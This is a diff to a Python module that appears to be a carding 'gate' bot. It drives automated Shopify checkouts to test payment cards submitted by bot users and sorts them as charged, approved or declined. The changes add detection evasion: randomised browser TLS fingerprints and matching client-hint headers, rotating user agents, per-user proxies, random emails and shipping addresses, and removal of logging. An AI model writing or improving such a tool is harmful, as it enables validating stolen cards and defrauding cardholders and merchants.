@@ -2,6 +2,8 @@ import json
 import random
 import re
 import time
+import time as _time
+import threading
 import html
 import urllib.parse
 from typing import Dict, List, Optional, Tuple, Any
@@ -254,7 +256,7 @@ def fetch_affordable_sites(api_url: str, max_amount: float) -> List["WorkingSite
     if not out:
         raise Exception("no affordable sites found in API payload")
 
-    print(f"[SITES] fetched {len(out)} affordable sites (under ${max_amount:.0f})")
+
     return out
 
 def parse_dashboard_html_sites(html_body: str, max_amount: float) -> List["WorkingSite"]:
@@ -319,7 +321,17 @@ def to_float(v: Any) -> Tuple[float, bool]:
 
 # ──────────────────────── Step 0: cheapest product ───────────────────
 
+_product_cache: Dict[str, tuple] = {}
+_product_cache_lock = threading.Lock()
+_PRODUCT_CACHE_TTL  = 3600  # ساعة
+
 def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.50) -> Tuple[str, str, str, str]:
+    now = _time.time()
+    with _product_cache_lock:
+        cached = _product_cache.get(shop_url)
+        if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
+            return cached[:-1]  # (title, product_id, variant_id, price_str)
+
     best_price = float('inf')
     product_title = product_id = variant_id = price_str = ""
 
@@ -353,6 +365,9 @@ def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0
 
     if not product_title:
         raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")
+
+    with _product_cache_lock:
+        _product_cache[shop_url] = (product_title, product_id, variant_id, price_str, now)
 
     return product_title, product_id, variant_id, price_str
 
@@ -499,11 +514,6 @@ def extract_identification_signature(checkout_html: str) -> str:
 
 def extract_pci_session_id(pci_body: str) -> str:
     match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
-    return match.group(1) if match else ""
-
-def extract_private_access_token_id(checkout_html: str) -> str:
-    unescaped = html.unescape(checkout_html)
-    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
     return match.group(1) if match else ""
 
 def extract_delivery_handle(proposal_body: str) -> str:
@@ -798,7 +808,7 @@ def send_pci_session(ident_sig: str, card_number: str, card_name: str,
     }
 
     # Use curl_cffi with impersonation — consistent with TLSClient
-    with Session(impersonate="chrome124") as session:
+    with Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
         resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
@@ -807,24 +817,36 @@ def send_pci_session(ident_sig: str, card_number: str, card_name: str,
 
 # ──────────────────────── Proposal helpers ───────────────────────────
 
+_SEC_CH_UA_MAP = {
+    "chrome124": ('"Google Chrome";v="124", "Chromium";v="124", "Not-A.Brand";v="99"',   '"Windows"'),
+    "chrome120": ('"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',   '"Windows"'),
+    "chrome116": ('"Google Chrome";v="116", "Chromium";v="116", "Not-A.Brand";v="99"',   '"Windows"'),
+    "edge101":   ('"Microsoft Edge";v="101", "Chromium";v="101", "Not-A.Brand";v="99"',  '"Windows"'),
+    "safari15_5":('"Safari";v="15", "Not-A.Brand";v="99"',                               '"macOS"'),
+    "firefox133":('"Firefox";v="133", "Not-A.Brand";v="99"',                             '"Windows"'),
+}
+
 def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
-                      session_token: str, build_id: str, source_token: str) -> Dict:
+                      session_token: str, build_id: str, source_token: str,
+                      impersonate: str = "chrome124", user_agent: str = "") -> Dict:
+    sec_ch_ua, platform = _SEC_CH_UA_MAP.get(impersonate, _SEC_CH_UA_MAP["chrome124"])
+    ua = user_agent or random.choice(USER_AGENTS)
     return {
         "accept":                        "application/json",
-        "accept-language":               "en-US",
+        "accept-language":               "en-US,en;q=0.9",
         "content-type":                  "application/json",
         "origin":                        shop_url,
         "priority":                      "u=1, i",
         "referer":                       checkout_url,
-        "sec-ch-ua":                     '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+        "sec-ch-ua":                     sec_ch_ua,
         "sec-ch-ua-mobile":              "?0",
-        "sec-ch-ua-platform":            '"Windows"',
+        "sec-ch-ua-platform":            platform,
         "sec-fetch-dest":                "empty",
         "sec-fetch-mode":                "cors",
         "sec-fetch-site":                "same-origin",
         "shopify-checkout-client":       "checkout-web/1.0",
         "shopify-checkout-source":       f'id="{checkout_token}", type="cn"',
-        "user-agent":                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+        "user-agent":                    ua,
         "x-checkout-one-session-token":  session_token,
         "x-checkout-web-build-id":       build_id,
         "x-checkout-web-deploy-stage":   "production",
@@ -928,9 +950,12 @@ def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_
     resp = client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token, impersonate, user_agent)
     )
-    print(resp.text)
+    if resp.status_code == 429:
+        raise Exception("returned 429")
+    if resp.status_code >= 500:
+        raise Exception(f"returned {resp.status_code}")
     return resp.status_code, resp.text
 
 # ──────────────────────── Step 5: Proposal 2 (email) ─────────────────
@@ -1030,9 +1055,12 @@ def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout
     resp = client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token, impersonate, user_agent)
     )
-    print(resp.text)
+    if resp.status_code == 429:
+        raise Exception("returned 429")
+    if resp.status_code >= 500:
+        raise Exception(f"returned {resp.status_code}")
     return resp.status_code, resp.text
 
 # ──────────────────────── Step 6: Proposal 3 (address) ───────────────
@@ -1150,9 +1178,12 @@ def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout
     resp = client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token, impersonate, user_agent)
     )
-    print(resp.text)
+    if resp.status_code == 429:
+        raise Exception("returned 429")
+    if resp.status_code >= 500:
+        raise Exception(f"returned {resp.status_code}")
     return resp.status_code, resp.text
 
 # ──────────────────────── Step 10: SubmitForCompletion ───────────────
@@ -1168,11 +1199,10 @@ def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, c
     }
     full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
 
-    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
+    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token, impersonate, user_agent)
     headers["x-checkout-web-source-id"] = checkout_token  # poll uses checkout_token here
 
     resp = client.get(full_url, headers=headers)
-    print(resp.text)
     return resp.status_code, resp.text
 
 
@@ -1183,7 +1213,6 @@ def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: s
                                total_amount: str, pci_session_id: str, attempt_token: str,
                                currency: str, country: str, signed_handles: List[str],
                                is_digital: bool = False,
-                               item_amount: str = None,
                                tax_amount: str = None) -> Tuple[int, str]:
 
     handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
@@ -1378,37 +1407,43 @@ def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: s
     resp = client.post(
         f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
         data=gql_payload,
-        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token, impersonate, user_agent)
     )
-    print(resp.text)
+    if resp.status_code == 429:
+        raise Exception("returned 429")
+    if resp.status_code >= 500:
+        raise Exception(f"returned {resp.status_code}")
     return resp.status_code, resp.text
 
 # ──────────────────────── Error checking ─────────────────────────────
 
 def check_proposal_errors(step: str, status: int, body: str):
+    """Check for errors in proposal responses and raise exception if found."""
     if status != 200:
-        print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠</tg-emoji> {step}: HTTP {status}")
-    matches = re.findall(
-        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
-        body)
-    if not matches:
-        print(f"  <tg-emoji emoji-id='5289967092265660622'>✅</tg-emoji> {step}: No errors")
-        return
-    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠</tg-emoji> {step}: {len(matches)} error(s):")
-    for i, (code, msg) in enumerate(matches):
-        print(f"    [{i+1}] {code}" + (f" — {msg}" if msg else ""))
+        matches = re.findall(
+            r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
+            body)
+        if matches:
+            raise Exception(f"Proposal error in {step}: {matches[0][1]}")
+        else:
+            raise Exception(f"Proposal returned non-200 status: {status}")
 
 def check_submit_errors(status: int, body: str):
+    """Check SubmitForCompletion response for errors and raise exception."""
     if status != 200:
-        print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠</tg-emoji> SubmitForCompletion: HTTP {status}")
-    match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
-    if match:
-        print(f"  Result: {match.group(1)}")
-        if match.group(1) != "SubmitSuccess":
-            for i, (code, msg) in enumerate(re.findall(
-                r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
-                body)):
-                print(f"    [{i+1}] {code} — {msg}")
+        match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
+        if match:
+            typename = match.group(1)
+            if typename != "SubmitSuccess":
+                errors = re.findall(r'"code"\s*:\s*"([^"]+)"', body)
+                raise Exception(f"Submit failed with {typename}: {errors if errors else 'Unknown error'}")
+        else:
+            # No typename found, perhaps generic error
+            error_msg = extract_any_error(body)
+            if error_msg:
+                raise Exception(f"Submit error: {error_msg}")
+            else:
+                raise Exception(f"Submit returned non-200 status: {status}")
 
 # ──────────────────────── Orchestrator ───────────────────────────────
 
@@ -1425,7 +1460,6 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
         # ── Step 0: cheapest product ──────────────────────────────────
         try:
             title, product_id, variant_id, price = find_cheapest_product(client, shop_url)
-            print(f"  Found product: {title} - ${price}")
         except Exception as e:
             result.retryable = True
             result.error = Exception(f"Step 0 failed: {e}")
@@ -1466,7 +1500,9 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             submit_id   = extract_submit_for_completion_id(js_body)
             if not proposal_id or not submit_id:
                 raise Exception("missing Proposal or Submit ID")
-            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
+            if not poll_for_receipt_id:
+                poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"  # fallback
         except Exception as e:
             result.retryable = True
             result.error = Exception(f"Step 3 failed: {e}")
@@ -1535,14 +1571,12 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
 
                 # For digital products, no shipping needed — skip fallback loop
                 if is_digital:
-                    print(f"  <tg-emoji emoji-id='5364098734600762220'>🎯</tg-emoji> Digital product — skipping shipping address negotiation")
                     final_proposal_body = p3_body
                     final_queue_token   = q3
                     break
 
                 # Check if this address is rejected for shipping
                 if detect_shipping_restriction(p3_body) and fallback_idx < len(fallback_addrs):
-                    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠️</tg-emoji>  Store doesn't ship to {addr.country_code} — trying {fallback_addrs[fallback_idx].country_code}")
                     addr          = fallback_addrs[fallback_idx]
                     fallback_idx += 1
                     queue_token2  = q3  # advance queue token
@@ -1589,7 +1623,6 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
         # ── Step 10: Submit ───────────────────────────────────────────
         try:
             is_digital = not extract_is_shipping_required(final_proposal_body)
-            print(f"  Product type: {'DIGITAL' if is_digital else 'PHYSICAL'}")
 
             delivery_handle = extract_delivery_handle(final_proposal_body)
             if not delivery_handle and not is_digital:
@@ -1631,7 +1664,6 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                 )
 
                 if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
-                    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠️</tg-emoji>  Tax changed, retrying ({tax_attempt}/{MAX_TAX_RETRIES})")
                     new_tax   = extract_tax_from_rejected(submit_body)
                     new_total = extract_total_from_rejected(submit_body)
                     if new_tax:
@@ -1645,6 +1677,7 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
 
                 break  # clean exit
 
+            # Check for errors in submit response
             check_submit_errors(submit_status, submit_body)
 
             receipt_id = extract_receipt_id(submit_body)
@@ -1653,7 +1686,6 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
                 if "CAPTCHA" in (error_msg or ""):
                     error_msg = "CARD_DECLINED"
                 if error_msg:
-                    print(f"  Submit Error: {error_msg}")
                     result.status      = CheckStatus.DECLINED
                     result.status_code = error_msg
                     result.error       = Exception(error_msg)
@@ -1671,10 +1703,165 @@ def run_check(client: TLSClient, shop_url: str, site_name: str,
             result.error = e
             return result
 
-    except Exception as e:
-        result.error = e
+        # ── Step 11: Poll for receipt ──────────────────────────────────
+        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
+        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
 
-    return result
+        for poll_num in range(1, 31):
+            try:
+                _, poll_body = send_poll_for_receipt(
+                    client, shop_url, checkout_url, checkout_token, session_token,
+                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
+                )
+
+                receipt_type = ""
+                match = type_name_re.search(poll_body)
+                if match:
+                    receipt_type = match.group(1)
+
+                status_code = extract_receipt_status_code(poll_body, receipt_type)
+                result.status_code = status_code
+
+                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
+                    result.status      = CheckStatus.CHARGED
+                    result.status_code = "ORDER_PLACED"
+                    try:
+                        poll_json   = json.loads(poll_body)
+                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
+                        conf_url    = receipt_obj.get("confirmationPage", {}).get("url", "")
+                        result.receipt_url = conf_url or checkout_url
+                    except Exception:
+                        result.receipt_url = checkout_url
+                    return result
+
+                if receipt_type == "ActionRequiredReceipt":
+                    result.status = CheckStatus.APPROVED
+                    result.status_code = "3DS_AUTHENTICATION"
+                    return result
+
+                if receipt_type == "FailedReceipt":
+                    error_code = ""
+                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
+                    match = error_re.search(poll_body)
+                    if match:
+                        error_code = match.group(1)
+                    if "CAPTCHA" in error_code:
+                        error_code = "CARD_DECLINED"
+
+                    if error_code == "INSUFFICIENT_FUNDS":
+                        result.status = CheckStatus.APPROVED
+                        result.status_code = "INSUFFICIENT_FUNDS"
+                        return result
+                    elif error_code == "CARD_DECLINED":
+                        result.status = CheckStatus.DECLINED
+                        result.error = Exception(f"{error_code}")
+                        return result
+                    elif error_code == "GENERIC_ERROR":
+                        result.status = CheckStatus.DECLINED
+                        result.status_code = "CARD_DECLINED"
+                        result.error = Exception("CARD_DECLINED")
+                        return result
+                    else:
+                        if "InventoryReservationFailure" in poll_body:
+                            result.status = CheckStatus.ERROR
+                            result.retryable = True
+                            return result
+                        result.status = CheckStatus.DECLINED
+                        result.error = Exception(f"{error_code}")
+                        return result
+
+                delay = 500
+                match = poll_delay_re.search(poll_body)
+                if match:
+                    try:
+                        d = int(match.group(1))
+                        if d > 0:
+                            delay = d
+                    except ValueError:
+                        pass
+                time.sleep(min(delay, 300) / 1000.0)
+
+            except Exception as e:
+                result.status = CheckStatus.ERROR
+                result.error = Exception(f"poll {poll_num} failed: {e}")
+                return result
+
+        result.status = CheckStatus.ERROR
+        result.error = Exception("exceeded 30 poll attempts")
+        return result
+
+    finally:
+        client.close()
+
+# ──────────────────────── Site loader (site.txt) ─────────────────────
+
+def load_sites_from_file(path: Path) -> List[str]:
+    """Read site.txt — one URL per line, # lines ignored."""
+    with open(path, "r", encoding="utf-8") as f:
+        lines = f.read().splitlines()
+    sites = []
+    for raw in lines:
+        line = raw.strip()
+        if not line or line.startswith("#"):
+            continue
+        if not line.startswith(("http://", "https://")):
+            line = "https://" + line
+        sites.append(line.rstrip("/"))
+    if not sites:
+        raise Exception("site.txt is empty — add at least one Shopify URL")
+    return sites
+
+
+# ──────────────────────── Bot-facing async entry point ───────────────
+
+async def main(card_entry: str, user_id: int):
+    """
+    Called by cmd.py and response.py.
+    Returns: (success: bool, result: str, amount: str, proxy_hash: str)
+    """
+    from GATES.AUTOSHOPIFY.AUTOSH.shopify_db import shopify_db
+
+    # ── load sites from site.txt ──────────────────────────────────────
+    try:
+        sites = load_sites_from_file(SITE_TXT)
+    except FileNotFoundError:
+        return False, "No site.txt found — create GATES/AUTOSHOPIFY/AUTOSH/site.txt", "0", "None"
+    except Exception as e:
+        return False, str(e), "0", "None"
+
+    # ── load user proxies ─────────────────────────────────────────────
+    proxies_raw = await shopify_db.get_proxies(user_id)
+    if not proxies_raw:
+        return False, "no proxies", "0", "None"
+
+    proxy_entry = random.choice(proxies_raw)["proxy"]
+    try:
+        proxy_url = normalize_proxy(proxy_entry)
+    except Exception:
+        proxy_url = ""
+
+    proxy_hash = hashlib.md5(proxy_url.encode()).hexdigest()[:8] if proxy_url else "None"
+
+    # ── pick a random site and run the check in a thread ─────────────
+    shop_url = random.choice(sites)
+    result: CheckResult = await asyncio.to_thread(
+        run_checkout_for_card, shop_url, card_entry, proxy_url
+    )
+
+    # ── map CheckResult → legacy return format ────────────────────────
+    if result.status == CheckStatus.CHARGED:
+        return True, "ORDER_PLACED", result.amount or "0", proxy_hash, result.receipt_url
+
+    if result.status == CheckStatus.APPROVED:
+        return True, result.status_code or "APPROVED", result.amount or "0", proxy_hash, ""
+
+    if result.status == CheckStatus.DECLINED:
+        return False, str(result.error or result.status_code or "DECLINED"), "0", proxy_hash, ""
+
+    # ERROR
+    return False, str(result.error or result.status_code or "Unknown error"), "0", proxy_hash, ""
+
+# ──────────────────────── Card and proxy helpers ──────────────────────
 
 def load_card_entries(file_path: str) -> List[str]:
     with open(file_path, 'r') as f:
@@ -1746,8 +1933,8 @@ def test_proxy(proxy_url: str) -> bool:
         resp = session.get("https://api.ipify.org?format=json", timeout=10)
         if resp.status_code == 200 and resp.text.strip():
             return True
-    except Exception as e:
-        print(f"  Proxy test failed: {e}")
+    except Exception:
+        return False
     return False
 
 def find_working_proxies(proxies: List[str]) -> List[str]:
@@ -1757,29 +1944,26 @@ def find_working_proxies(proxies: List[str]) -> List[str]:
     for i, raw in enumerate(proxies):
         try:
             proxy_url = normalize_proxy(raw)
-        except Exception as e:
-            print(f"[Proxy {i+1}/{len(proxies)}] Invalid entry skipped: {e}")
+        except Exception:
             continue
         
         if proxy_url in seen:
-            print(f"[Proxy {i+1}/{len(proxies)}] Duplicate skipped: {proxy_url}")
             continue
         
-        print(f"[Proxy {i+1}/{len(proxies)}] Testing {proxy_url}")
         if test_proxy(proxy_url):
             seen.add(proxy_url)
             working.append(proxy_url)
-            print(f"[Proxy {i+1}/{len(proxies)}] OK, added to rotation.")
-        else:
-            print(f"[Proxy {i+1}/{len(proxies)}] Failed")
+        # else: silently skip
     
     if len(working) == 0:
         raise Exception("no working proxy found")
     
     return working
 
+# ──────────────────────── Main checkout function ──────────────────────
+
 def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
-    """Enhanced version with random browser fingerprints and addresses"""
+    """Enhanced version with random browser fingerprints and addresses, with shipping fallback."""
     currency = "USD"
     country = "US"
     site_name = shop_url.replace("https://", "").replace("http://", "")
@@ -1800,12 +1984,10 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
     
     # Generate random email for this checkout
     email = generate_random_email()
-    print(f"  Using email: {email}")
     
     # Random browser fingerprint for each attempt
     impersonate = random.choice(BROWSER_PROFILES)
     user_agent = random.choice(USER_AGENTS)
-    print(f"  Browser fingerprint: {impersonate}")
     
     # Create TLS client with curl_cffi
     client = TLSClient(timeout=12, proxy_url=proxy_url,
@@ -1815,7 +1997,6 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
         # Step 0 - Find cheapest product
         try:
             title, product_id, variant_id, price = find_cheapest_product(client, shop_url)
-            print(f"  Found product: {title} - ${price}")
             _ = title, product_id
         except Exception as e:
             result.status = CheckStatus.ERROR
@@ -1859,7 +2040,9 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             submit_id = extract_submit_for_completion_id(js_body)
             if not proposal_id or not submit_id:
                 raise Exception("missing Proposal or Submit ID")
-            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
+            if not poll_for_receipt_id:
+                poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"  # fallback
         except Exception as e:
             result.status = CheckStatus.ERROR
             result.retryable = True
@@ -1906,45 +2089,55 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             result.error = Exception(f"Step 5 failed: {e}")
             return result
         
-        # Step 6 - Third proposal with address
+        # Step 6 - Third proposal with address (with fallback)
         try:
             addr = address_for_country(country)
-            print(f"  Using address: {addr.city}, {addr.country_code}")
-            _, proposal3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
-                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
-                                                queue_token2, email, addr, currency, country)
-            queue_token3 = extract_queue_token(proposal3_body)
-            if not queue_token3:
-                raise Exception("could not extract queueToken")
+            # Use similar fallback logic as run_check
+            fallback_addrs = get_fallback_addresses(addr.country_code)
+            fallback_idx = 0
+            final_proposal_body = None
+            final_queue_token = None
+            
+            for attempt in range(1 + len(fallback_addrs)):
+                _, p3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
+                                            stable_id, variant_id, price, proposal_id, build_id, source_token,
+                                            queue_token2, email, addr, currency, country)
+                
+                q3 = extract_queue_token(p3_body)
+                if not q3:
+                    raise Exception("could not extract queueToken from proposal3")
+                
+                is_digital = not extract_is_shipping_required(p3_body)
+                if is_digital:
+                    final_proposal_body = p3_body
+                    final_queue_token = q3
+                    break
+                
+                if detect_shipping_restriction(p3_body) and fallback_idx < len(fallback_addrs):
+                    addr = fallback_addrs[fallback_idx]
+                    fallback_idx += 1
+                    queue_token2 = q3
+                    continue
+                
+                # Address accepted
+                signed_check = extract_signed_handles(p3_body)
+                if not signed_check:
+                    time.sleep(0.05)
+                    _, p3_body2 = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
+                                                 stable_id, variant_id, price, proposal_id, build_id, source_token,
+                                                 q3, email, addr, currency, country)
+                    q3 = extract_queue_token(p3_body2) or q3
+                    p3_body = p3_body2
+                
+                final_proposal_body = p3_body
+                final_queue_token = q3
+                break
+            
+            if not final_proposal_body:
+                raise Exception("No shipping available after fallback attempts")
         except Exception as e:
             result.status = CheckStatus.ERROR
             result.error = Exception(f"Step 6 failed: {e}")
-            return result
-        
-        # Step 7 - Fourth proposal (repeat)
-        time.sleep(0.05)
-        try:
-            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
-                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
-                                                queue_token3, email, addr, currency, country)
-            queue_token4 = extract_queue_token(proposal4_body)
-            if not queue_token4:
-                raise Exception("could not extract queueToken")
-        except Exception as e:
-            result.status = CheckStatus.ERROR
-            result.error = Exception(f"Step 7 failed: {e}")
-            return result
-        
-        # Step 8 - Fifth proposal
-        time.sleep(0.05)
-        try:
-            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
-                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
-                                                               queue_token4, email, addr, currency, country)
-            _ = proposal5_status
-        except Exception as e:
-            result.status = CheckStatus.ERROR
-            result.error = Exception(f"Step 8 failed: {e}")
             return result
         
         # Step 9 - PCI Session
@@ -1965,44 +2158,41 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             result.error = Exception(f"Step 9 failed: {e}")
             return result
         
+        # Step 10 - Submit
         try:
-            queue_token5 = extract_queue_token(proposal5_body)
-            if not queue_token5:
-                raise Exception("could not extract queueToken")
+            queue_token5 = final_queue_token  # use the last queue token from proposal3
+            
+            is_digital = not extract_is_shipping_required(final_proposal_body)
 
-            # ── Detect digital vs physical from proposal5 response ──
-            is_digital = not extract_is_shipping_required(proposal5_body)
-            print(f"  Product type: {'DIGITAL' if is_digital else 'PHYSICAL'}")
-
-            delivery_handle = extract_delivery_handle(proposal5_body)
+            delivery_handle = extract_delivery_handle(final_proposal_body)
             if not delivery_handle and not is_digital:
                 result.retryable = True
                 raise Exception("Step 10 failed: could not extract delivery handle")
 
-            signed_handles = extract_signed_handles(proposal5_body)
+            signed_handles = extract_signed_handles(final_proposal_body)
             if len(signed_handles) == 0 and not is_digital:
                 result.retryable = True
                 raise Exception("Step 10 failed: could not extract signedHandles")
 
-            shipping_amount = extract_shipping_amount(proposal5_body)
+            shipping_amount = extract_shipping_amount(final_proposal_body)
             if not shipping_amount and not is_digital:
                 result.retryable = True
                 raise Exception("Step 10 failed: could not extract shipping amount")
             if not shipping_amount:
-                shipping_amount = "0.00"  # digital products have no shipping
+                shipping_amount = "0.00"
 
-            total_amount = extract_checkout_total(proposal5_body)
+            total_amount = extract_checkout_total(final_proposal_body)
             if not total_amount:
-                total_amount = extract_seller_total(proposal5_body)
+                total_amount = extract_seller_total(final_proposal_body)
             if not total_amount and is_digital:
-                total_amount = extract_running_total(proposal5_body)  # digital uses runningTotal
+                total_amount = extract_running_total(final_proposal_body)
             if not total_amount:
                 raise Exception("Step 10 failed: could not extract total amount")
             result.amount = total_amount
 
             attempt_token = generate_attempt_token(checkout_token)
             
-            current_tax    = extract_tax_amount(proposal5_body)
+            current_tax    = extract_tax_amount(final_proposal_body)
             current_total  = total_amount
             
             MAX_TAX_RETRIES = 3
@@ -2016,9 +2206,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                     tax_amount=current_tax
                 )
                 
-                # Check for tax change rejection specifically
                 if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
-                    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠️</tg-emoji>  Tax changed, retrying with new tax (attempt {tax_attempt}/{MAX_TAX_RETRIES})")
                     new_tax   = extract_tax_from_rejected(submit_body)
                     new_total = extract_total_from_rejected(submit_body)
                     if new_tax:
@@ -2028,9 +2216,8 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                     time.sleep(0.05)
                     continue
                 
-                # No tax error — break and proceed normally
                 break
-            _ = submit_status
+            
             check_submit_errors(submit_status, submit_body)
 
             receipt_id = extract_receipt_id(submit_body)
@@ -2040,7 +2227,6 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 if "CAPTCHA" in (error_msg or ""):
                     error_msg = "CARD_DECLINED"
                 if error_msg:
-                    print(f"  Submit Error: {error_msg}")
                     result.status = CheckStatus.DECLINED
                     result.status_code = error_msg
                     result.error = Exception(error_msg)
@@ -2079,7 +2265,6 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 result.status_code = status_code
                 
                 if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
-                    print(f"  Poll {poll_num}: SUCCESS! Order placed!")
                     result.status      = CheckStatus.CHARGED
                     result.status_code = "ORDER_PLACED"
                     try:
@@ -2092,9 +2277,8 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                     return result
                 
                 if receipt_type == "ActionRequiredReceipt":
-                    print(f"  Poll {poll_num}: 3DS_AUTHENTICATION")
                     result.status = CheckStatus.APPROVED
-                    result.status_code = "3DS_AUTHENTICATION"
+                    result.status_code = "3DS_REQUIRED"
                     return result
                 
                 if receipt_type == "FailedReceipt":
@@ -2150,71 +2334,3 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
         
     finally:
         client.close()
-
-# ──────────────────────── Site loader (site.txt) ─────────────────────
-
-def load_sites_from_file(path: Path) -> List[str]:
-    """Read site.txt — one URL per line, # lines ignored."""
-    with open(path, "r", encoding="utf-8") as f:
-        lines = f.read().splitlines()
-    sites = []
-    for raw in lines:
-        line = raw.strip()
-        if not line or line.startswith("#"):
-            continue
-        if not line.startswith(("http://", "https://")):
-            line = "https://" + line
-        sites.append(line.rstrip("/"))
-    if not sites:
-        raise Exception("site.txt is empty — add at least one Shopify URL")
-    return sites
-
-
-# ──────────────────────── Bot-facing async entry point ───────────────
-
-async def main(card_entry: str, user_id: int):
-    """
-    Called by cmd.py and response.py.
